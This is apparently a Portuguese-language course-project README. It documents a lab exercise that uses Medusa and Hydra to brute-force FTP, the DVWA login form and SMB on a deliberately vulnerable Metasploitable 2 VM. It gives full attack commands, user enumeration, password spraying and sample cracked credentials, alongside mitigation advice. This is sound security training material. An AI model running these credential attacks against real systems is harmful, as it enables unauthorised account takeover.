# 🔐 Ataques de Força Bruta com Medusa e Kali Linux

> Projeto prático de auditoria de segurança em ambiente controlado, simulando ataques de força bruta contra serviços **FTP**, **Web (DVWA)** e **SMB**, com as respectivas medidas de mitigação.

[![Kali Linux](https://img.shields.io/badge/Kali%20Linux-557C94?logo=kalilinux&logoColor=white)](https://www.kali.org/)
[![Medusa](https://img.shields.io/badge/Medusa-Brute%20Force-red)](http://www.foofus.net/jmk/medusa/medusa.html)
[![License](https://img.shields.io/badge/uso-educacional-blue)](#-aviso-legal)

---

## ⚠️ Aviso Legal

Todo o conteúdo deste repositório foi produzido **exclusivamente para fins educacionais**, dentro de um **laboratório isolado** composto por máquinas virtuais em rede *host-only* (sem acesso à internet ou a redes de produção). As máquinas-alvo (Metasploitable 2 e DVWA) são **propositalmente vulneráveis** e distribuídas para treino de segurança.

**Nunca** execute estas técnicas contra sistemas, redes ou contas que você não possui ou para os quais não tenha autorização formal por escrito. Ataques de força bruta sem autorização são crime (no Brasil, Lei nº 12.737/2012 – "Lei Carolina Dieckmann" – e Art. 154-A do Código Penal).

---

## 📑 Sumário

- [Objetivos](#-objetivos)
- [Arquitetura do Laboratório](#-arquitetura-do-laboratório)
- [Preparação do Ambiente](#-preparação-do-ambiente)
- [Reconhecimento com Nmap](#-reconhecimento-com-nmap)
- [Entendendo o Medusa](#-entendendo-o-medusa)
- [Cenário 1 — Força Bruta em FTP](#-cenário-1--força-bruta-em-ftp)
- [Cenário 2 — Força Bruta em Formulário Web (DVWA)](#-cenário-2--força-bruta-em-formulário-web-dvwa)
- [Cenário 3 — Password Spraying em SMB](#-cenário-3--password-spraying-em-smb)
- [Wordlists](#-wordlists)
- [Medidas de Mitigação](#-medidas-de-mitigação)
- [Conclusão e Aprendizados](#-conclusão-e-aprendizados)
- [Referências](#-referências)

---

## 🎯 Objetivos

- Compreender como funcionam ataques de força bruta em diferentes serviços (FTP, Web, SMB).
- Utilizar **Kali Linux** e **Medusa** para auditoria de senhas em ambiente controlado.
- Documentar o processo técnico de forma clara, reprodutível e estruturada.
- Reconhecer vulnerabilidades comuns e propor **medidas de mitigação** eficazes.
- Usar o **GitHub** como portfólio técnico.

---

## 🧩 Arquitetura do Laboratório

```
┌───────────────────────────────────────────────┐
│                   VirtualBox (Host-Only)                 │
│                   Rede: 192.168.56.0/24                   │
│                                                          │
│   ┌──────────────────┐          ┌─────────────────┐     │
│   │   KALI LINUX     │          │  METASPLOITABLE 2│     │
│   │   (Atacante)     │  ──────▶ │     (Alvo)       │     │
│   │  192.168.56.101  │          │  192.168.56.102  │     │
│   │                  │          │                  │     │
│   │  • Medusa        │          │  • FTP  (21)     │     │
│   │  • Nmap          │          │  • SMB  (139/445)│     │
│   │  • DVWA (local)* │          │  • Telnet, SSH…  │     │
│   └──────────────────┘          └─────────────────┘     │
└────────────────────────────────────────────────┘

* O DVWA pode rodar na própria Metasploitable 2 (que já o inclui)
  ou em um container/VM separada. Veja o Cenário 2.
```

| Componente | Função | IP (exemplo) |
|------------|--------|--------------|
| Kali Linux | Máquina atacante | `192.168.56.101` |
| Metasploitable 2 | Alvo vulnerável (FTP, SMB, DVWA) | `192.168.56.102` |

> 💡 Ajuste os IPs conforme a sua rede. Descubra os IPs reais com `ip a` (Kali) e `ifconfig` (Metasploitable).

---

## 🛠️ Preparação do Ambiente

### 1. Baixar as imagens

- **Kali Linux** (imagem pré-pronta para VirtualBox): https://www.kali.org/get-kali/#kali-virtual-machines
- **Metasploitable 2**: https://sourceforge.net/projects/metasploitable/

### 2. Criar a rede Host-Only no VirtualBox

`Arquivo ▸ Ferramentas ▸ Gerenciador de Rede ▸ Criar`

Isso gera um adaptador (ex.: `vboxnet0`) com faixa `192.168.56.0/24`. **Deixe o DHCP ativado** para facilitar, ou configure IPs estáticos.

### 3. Configurar o adaptador de rede das duas VMs

Em cada VM: `Configurações ▸ Rede ▸ Adaptador 1 ▸ Conectado a: Rede Somente-Hospedeiro (Host-Only)`.

> ✅ **Por que host-only?** Garante que as máquinas vulneráveis fiquem **isoladas da internet** e da sua rede real — essencial para um laboratório seguro.

### 4. Validar a conectividade

Na Kali, teste o ping até o alvo:

```bash
ping -c 4 192.168.56.102
```

### Credenciais padrão das VMs

| VM | Usuário | Senha |
|----|---------|-------|
| Kali Linux | `kali` | `kali` |
| Metasploitable 2 | `msfadmin` | `msfadmin` |

---

## 🔎 Reconhecimento com Nmap

Antes de atacar, identifique os serviços expostos no alvo:

```bash
# Varredura de serviços e versões nas portas mais comuns
nmap -sV 192.168.56.102

# Varredura focada nos serviços deste laboratório
nmap -p 21,139,445,80 -sV 192.168.56.102
```

Saída esperada (resumida):

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

> 📝 O reconhecimento confirma **quais serviços** estão de pé e **quais versões** — informação que direciona o ataque e a priorização de correções.

---

## 🧰 Entendendo o Medusa

O **Medusa** é um brute-forcer paralelo, modular e rápido. Sintaxe essencial:

```bash
medusa -h <alvo> -u <usuário> -P <wordlist_senhas> -M <módulo>
```

| Flag | Descrição |
|------|-----------|
| `-h` | Host alvo (ou `-H` para arquivo com vários hosts) |
| `-u` | Usuário único (ou `-U` para arquivo de usuários) |
| `-p` | Senha única (ou `-P` para arquivo de senhas) |
| `-M` | Módulo/serviço (`ftp`, `http`, `smbnt`, `ssh`…) |
| `-t` | Nº de logins paralelos (threads) |
| `-f` | Para após encontrar a primeira credencial válida no host |
| `-n` | Porta não-padrão |
| `-v` | Nível de verbosidade (ex.: `-v 4`) |

Listar os módulos disponíveis:

```bash
medusa -d
```

---

## 🎯 Cenário 1 — Força Bruta em FTP

**Objetivo:** descobrir a senha de um usuário FTP no alvo.

### Comando

```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlists/passwords.txt -M ftp -t 4 -f -v 4
```

Testando **múltiplos usuários** de uma vez:

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4
```

### Interpretando a saída

```
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: msfadmin Password: 123456 (1 of 7 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

A linha **`ACCOUNT FOUND … [SUCCESS]`** indica a credencial válida.

### Validação do acesso

```bash
ftp 192.168.56.102
# Name: msfadmin
# Password: msfadmin
# ftp> ls      (confirma o login bem-sucedido)
```

---

## 🌐 Cenário 2 — Força Bruta em Formulário Web (DVWA)

O **DVWA** usa autenticação via formulário HTTP. Isso exige o módulo `http` do Medusa com os parâmetros do `POST` e o tratamento do **cookie de sessão** + **token CSRF**.

> 🔧 Acesse o DVWA pelo navegador da Kali: `http://192.168.56.102/dvwa` (login padrão `admin` / `password`). Em *DVWA Security*, defina o nível como **Low** para o exercício inicial.

### Passo 1 — Capturar os dados da requisição

Abra as **Ferramentas do Desenvolvedor (F12) ▸ aba Network**, faça um login qualquer na página *Brute Force* do DVWA e observe:

- O caminho: `/dvwa/vulnerabilities/brute/`
- Os parâmetros GET/POST: `username`, `password`, `Login`
- A mensagem de falha: `Username and/or password incorrect.`
- O **cookie**: `PHPSESSID=...; security=low`

### Passo 2 — Montar o comando (módulo `http`)

```bash
medusa -h 192.168.56.102 \
  -u admin \
  -P wordlists/passwords.txt \
  -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m FORM-DATA:"GET" \
  -m DENY-SIGNAL:"Username and/or password incorrect." \
  -m HEADER:"Cookie: PHPSESSID=SEU_SESSION_ID; security=low" \
  -t 1 -v 4
```

> ⚠️ **Dica realista:** o parsing de formulário web no Medusa é sensível. Na prática, muita gente obtém resultados mais consistentes com o **Hydra** para formulários HTTP. Incluí a alternativa abaixo para você comparar as ferramentas (um dos objetivos do desafio é justamente explorar).

### Alternativa com Hydra (http-get-form)

```bash
hydra 192.168.56.102 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=SEU_SESSION_ID; security=low" \
  -l admin -P wordlists/passwords.txt -t 4 -V
```

### Resultado esperado

```
[80][http-get-form] host: 192.168.56.102   login: admin   password: password
```

---

## 📡 Cenário 3 — Password Spraying em SMB

**Password spraying** inverte a lógica da força bruta: em vez de testar muitas senhas contra **um** usuário (o que dispara bloqueios), testa **uma senha** contra **muitos usuários**. É mais furtivo e eficaz contra políticas de *lockout*.

### Passo 1 — Enumerar usuários SMB

```bash
# Com enum4linux
enum4linux -U 192.168.56.102

# Ou com nmap
nmap --script smb-enum-users -p 445 192.168.56.102
```

Anote os usuários encontrados em `wordlists/users.txt`.

### Passo 2 — Spraying com uma única senha

```bash
# Uma senha testada contra TODOS os usuários (-p, minúsculo)
medusa -h 192.168.56.102 -U wordlists/users.txt -p msfadmin -M smbnt -t 1 -v 4
```

### Passo 3 — Validar o acesso

```bash
# Listar compartilhamentos com a credencial descoberta
smbclient -L //192.168.56.102 -U msfadmin

# Acessar um compartilhamento
smbclient //192.168.56.102/tmp -U msfadmin
```

> 🧠 **Observação:** o módulo correto para SMB moderno no Medusa é `smbnt`. Em alvos muito antigos, `smbnt` ainda funciona bem contra o Samba da Metasploitable.

---

## 📝 Wordlists

Este repositório inclui wordlists **didáticas e propositalmente pequenas** (veja a pasta [`/wordlists`](./wordlists)):

- [`users.txt`](./wordlists/users.txt) — nomes de usuário comuns + os conhecidos da Metasploitable.
- [`passwords.txt`](./wordlists/passwords.txt) — senhas fracas clássicas, incluindo as válidas do laboratório.

Para ataques reais de auditoria, o Kali já traz wordlists robustas:

```bash
# A famosa rockyou (descompacte antes de usar)
gunzip /usr/share/wordlists/rockyou.txt.gz
ls -lh /usr/share/wordlists/rockyou.txt
```

Gerar wordlists customizadas com **Crunch**:

```bash
# Senhas numéricas de 4 dígitos (0000–9999)
crunch 4 4 0123456789 -o wordlists/pin4.txt
```

---

## 🛡️ Medidas de Mitigação

Documentar o ataque só faz sentido se você souber **como se defender**. Para cada serviço:

### Geral (todos os serviços)

| Medida | Por quê |
|--------|---------|
| **Senhas fortes e únicas** | Inviabiliza wordlists e tabelas conhecidas |
| **MFA / 2FA** | Mesmo com a senha, o acesso é barrado |
| **Bloqueio por tentativas (lockout)** | Interrompe a força bruta após N falhas |
| **Rate limiting / atraso progressivo** | Torna o ataque lento demais para ser viável |
| **Monitoramento e alertas (SIEM/logs)** | Detecta picos de falhas de login |

### FTP

- Preferir **SFTP/FTPS** (FTP puro trafega credenciais em texto claro).
- Restringir acesso por IP (firewall/`hosts.allow`).
- Desabilitar login anônimo quando não necessário.
- **Fail2ban** monitorando o log do serviço FTP para banir IPs abusivos:

```ini
# /etc/fail2ban/jail.local
[vsftpd]
enabled  = true
maxretry = 3
bantime  = 3600
```

### Web (DVWA / aplicações)

- Implementar **CAPTCHA** após X falhas.
- **Tokens CSRF** válidos por requisição (DVWA demonstra isso nos níveis *Medium/High*).
- Bloqueio de conta + notificação ao usuário.
- WAF (Web Application Firewall) com regras anti-brute-force.

### SMB

- Desativar **SMBv1** (protocolo legado e inseguro).
- Política de senhas e **lockout** no domínio/host.
- Restringir SMB à rede interna (nunca expor as portas 139/445 à internet).
- Auditar e remover contas padrão/inativas.

> 📌 **Teste a defesa:** no DVWA, suba a *Security* para **Medium** e depois **High** e repita o Cenário 2. Você verá o impacto do token CSRF e do atraso artificial — a força bruta deixa de funcionar com o comando anterior.

---

## ✅ Conclusão e Aprendizados

- Força bruta explora o elo mais fraco: **senhas previsíveis**. Nenhum serviço é imune a credenciais ruins.
- Cada serviço (FTP, Web, SMB) tem **particularidades** que mudam a abordagem do ataque — especialmente formulários web, que exigem cookie/CSRF.
- **Password spraying** mostra por que o *lockout* sozinho não basta.
- A defesa eficaz é **em camadas**: senha forte + MFA + lockout + monitoramento.
- Ferramentas como Medusa, Hydra e Nmap são tão úteis para o **atacante** quanto para o **defensor** que valida a própria postura de segurança.

---

## 📚 Referências

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [Medusa – Documentação (foofus.net)](http://www.foofus.net/jmk/medusa/medusa.html)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Metasploitable 2 – Guia de Exploração (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [Nmap – Manual Oficial](https://nmap.org/book/)
- [OWASP – Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)

---

<div align="center">

Desenvolvido como entrega do desafio **DIO** — *Criando um Ataque Brute Force de senhas com Medusa e Kali Linux*.

</div>
